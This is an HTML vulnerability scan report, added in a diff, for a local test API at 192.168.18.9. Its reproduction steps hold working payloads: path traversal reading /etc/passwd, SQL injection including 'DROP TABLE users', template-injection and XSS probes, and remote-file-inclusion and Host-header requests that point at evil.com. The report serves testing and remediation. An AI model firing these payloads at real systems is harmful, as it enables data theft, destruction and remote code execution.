@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'none'; style-src 'self' 'unsafe-inline';">
+    <title>ApiXploit Security Report</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 20px; 
+            background-color: #f0f4f8 !important; 
+        }
+        h1 { 
+            color: #2c3e50 !important; 
+            font-size: 28px; 
+            text-align: center; 
+            margin-bottom: 20px; 
+        }
+        p { 
+            font-size: 16px; 
+            color: #34495e !important; 
+        }
+        strong { 
+            color: #2980b9 !important; 
+        }
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            margin-top: 20px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+        }
+        th, td { 
+            border: 2px solid #7f8c8d !important; 
+            padding: 12px; 
+            text-align: left; 
+            vertical-align: top; 
+        }
+        th { 
+            background-color: #3498db !important; 
+            color: white !important; 
+            font-weight: bold; 
+        }
+        tr:nth-child(even) { 
+            background-color: #ecf0f1 !important; 
+        }
+        tr:nth-child(odd) { 
+            background-color: #ffffff !important; 
+        }
+        tr:hover { 
+            background-color: #dfe6e9 !important; 
+        }
+        .high { 
+            color: #c0392b !important; 
+            font-weight: bold; 
+        }
+        .medium { 
+            color: #f39c12 !important; 
+            font-weight: bold; 
+        }
+        .unknown {
+            color: #7f8c8d !important;
+            font-weight: bold;
+        }
+        .steps { 
+            font-family: "Courier New", monospace; 
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            background-color: #f9f9f9; 
+            padding: 5px; 
+            border-radius: 3px; 
+        }
+    </style>
+</head>
+<body>
+    <h1>ApiXploit Security Report</h1>
+    <p><strong>Target:</strong> http://192.168.18.9:8000</p>
+    <p><strong>Timestamp:</strong> 2025-03-16 17:51:36</p>
+    <p><strong>Total Findings:</strong> 9</p>
+    <table>
+        <tr>
+            <th>Type</th>
+            <th>Severity</th>
+            <th>Description</th>
+            <th>Steps to Reproduce</th>
+            <th>Mitigation</th>
+        </tr>
+        <tr>
+            <td>Missing/Insecure X-Content-Type-Options</td>
+            <td class="medium">Medium</td>
+            <td>X-Content-Type-Options header is not properly configured</td>
+            <td><div class="steps">GET http://192.168.18.9:8000 (check headers)</div></td>
+            <td>Configure X-Content-Type-Options correctly</td>
+        </tr>
+        <tr>
+            <td>Missing/Insecure X-Frame-Options</td>
+            <td class="medium">Medium</td>
+            <td>X-Frame-Options header is not properly configured</td>
+            <td><div class="steps">GET http://192.168.18.9:8000 (check headers)</div></td>
+            <td>Configure X-Frame-Options correctly</td>
+        </tr>
+        <tr>
+            <td>Missing/Insecure Content-Security-Policy</td>
+            <td class="medium">Medium</td>
+            <td>Content-Security-Policy header is not properly configured</td>
+            <td><div class="steps">GET http://192.168.18.9:8000 (check headers)</div></td>
+            <td>Configure Content-Security-Policy correctly</td>
+        </tr>
+        <tr>
+            <td>HOST Header Injection (HHI)</td>
+            <td class="high">High</td>
+            <td>The application is vulnerable to HOST Header Injection attacks. This vulnerability allows an attacker to inject malicious HOST headers, potentially leading to various security issues like cache poisoning or cross-site scripting.</td>
+            <td><div class="steps">POST http://192.168.18.9:8000/api/hhivuln with Host: evil.com and {&quot;email&quot;: &quot;test&quot;}</div></td>
+            <td>Validate and sanitize the Host header</td>
+        </tr>
+        <tr>
+            <td>Local File Inclusion (LFI)</td>
+            <td class="high">High</td>
+            <td>The endpoint http://192.168.18.9:8000/api/lfivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.</td>
+            <td><div class="steps">Send POST request to http://192.168.18.9:8000/api/lfivuln with JSON body: {&#x27;filename&#x27;: &#x27;/etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {&#x27;mathexp&#x27;: &#x27;/etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {&#x27;mathexp&#x27;: &#x27;../etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {&#x27;mathexp&#x27;: &#x27;../../etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {&#x27;mathexp&#x27;: &#x27;../../../etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {&#x27;mathexp&#x27;: &#x27;file:///etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {&#x27;username&#x27;: &#x27;/etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {&#x27;username&#x27;: &#x27;../etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {&#x27;username&#x27;: &#x27;../../etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {&#x27;username&#x27;: &#x27;../../../etc/passwd&#x27;}
+Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {&#x27;username&#x27;: &#x27;file:///etc/passwd&#x27;}</div></td>
+            <td>Sanitize and validate all file path inputs. Implement a whitelist for allowed files.</td>
+        </tr>
+        <tr>
+            <td>SQL Injection (SQLite3)</td>
+            <td class="high">High</td>
+            <td>The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.</td>
+            <td><div class="steps">POST http://192.168.18.9:8000/api/sqlivuln with {&quot;username&quot;: &quot;&#x27; UNION SELECT name, sql FROM sqlite_master WHERE type=&#x27;table&#x27; --&quot;, &quot;password&quot;: &quot;test&quot;}
+POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;&#x27; UNION SELECT sqlite_version(), NULL --&quot;}
+POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;&#x27; UNION SELECT name, sql FROM sqlite_master WHERE type=&#x27;table&#x27; --&quot;}
+POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;&#x27; AND sqlite_version() --&quot;}
+POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;&#x27;; DROP TABLE users; --&quot;}
+POST http://192.168.18.9:8000/api/xssreflected with {&quot;username&quot;: &quot;&#x27; UNION SELECT sqlite_version(), NULL --&quot;, &quot;password&quot;: &quot;test&quot;}
+POST http://192.168.18.9:8000/api/xssreflected with {&quot;username&quot;: &quot;&#x27; UNION SELECT name, sql FROM sqlite_master WHERE type=&#x27;table&#x27; --&quot;, &quot;password&quot;: &quot;test&quot;}
+POST http://192.168.18.9:8000/api/xssreflected with {&quot;username&quot;: &quot;&#x27; AND sqlite_version() --&quot;, &quot;password&quot;: &quot;test&quot;}
+POST http://192.168.18.9:8000/api/xssreflected with {&quot;username&quot;: &quot;&#x27;; DROP TABLE users; --&quot;, &quot;password&quot;: &quot;test&quot;}</div></td>
+            <td>Use parameterized queries or prepared statements and sanitize all user inputs.</td>
+        </tr>
+        <tr>
+            <td>Server-Side Template Injection (SSTI)</td>
+            <td class="high">High</td>
+            <td>The application is prone to Server-Side Template Injection attacks. SSTI occurs when user input is used directly in server-side templates, potentially leading to code execution on the server.</td>
+            <td><div class="steps">GET http://192.168.18.9:8000/api/sstinovuln?mathexp={{7*7}}
+GET http://192.168.18.9:8000/api/sstinovuln?mathexp={# 7 * 7 #}
+POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;{{7*7}}&quot;}</div></td>
+            <td>Sanitize user input and avoid dynamic template evaluation</td>
+        </tr>
+        <tr>
+            <td>Cross-Site Scripting (XSS)</td>
+            <td class="high">High</td>
+            <td>The application is susceptible to Cross-Site Scripting attacks. These vulnerabilities occur when unvalidated user inputs are rendered directly in the HTML page, allowing malicious scripts to be executed in the context of the website.</td>
+            <td><div class="steps">POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;}
+POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;&#x27;&gt;&lt;img src=x onerror=alert(1)&gt;&quot;}
+POST http://192.168.18.9:8000/api/xssreflected with {&quot;username&quot;: &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;}
+POST http://192.168.18.9:8000/api/xssreflected with {&quot;username&quot;: &quot;&#x27;&gt;&lt;img src=x onerror=alert(1)&gt;&quot;}</div></td>
+            <td>Sanitize user input and implement Content Security Policy (CSP)</td>
+        </tr>
+        <tr>
+            <td>Remote File Inclusion (RFI)</td>
+            <td class="high">High</td>
+            <td>The application is vulnerable to Remote File Inclusion attacks. RFI occurs when user-supplied input is used to include remote files from external servers, leading to potential code execution and unauthorized access.</td>
+            <td><div class="steps">POST http://192.168.18.9:8000/api/sstivuln with {&quot;mathexp&quot;: &quot;http://evil.com/malicious.php&quot;}
+POST http://192.168.18.9:8000/api/xssreflected with {&quot;username&quot;: &quot;http://evil.com/malicious.php&quot;}</div></td>
+            <td>Disallow remote file inclusion and validate inputs</td>
+        </tr>
+    </table>
+</body>
+</html>
